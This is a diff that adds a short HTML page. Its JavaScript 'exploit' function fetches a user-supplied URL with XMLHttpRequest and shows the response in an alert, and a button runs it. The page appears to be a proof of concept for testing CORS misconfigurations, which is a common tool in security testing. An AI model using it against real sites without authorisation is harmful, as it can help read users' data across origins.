@@ -1,0 +1,17 @@
+<script>
+var jsonData = {};
+function exploit() {
+var urlVar = document.getElementById("varInput").value    
+var xmlhttp = new XMLHttpRequest();  
+xmlhttp.onreadystatechange = function() {
+if (this.readyState == 4) {
+var jsonString = this.responseText;
+alert(jsonString);
+};
+};
+xmlhttp.open("GET", urlVar);
+xmlhttp.send(JSON.stringify(jsonData));
+};
+</script>
+<input type="text" placeholder="Put CORS test page here" id="varInput"></input>
+<button onclick="exploit();">run proof of concept</button>
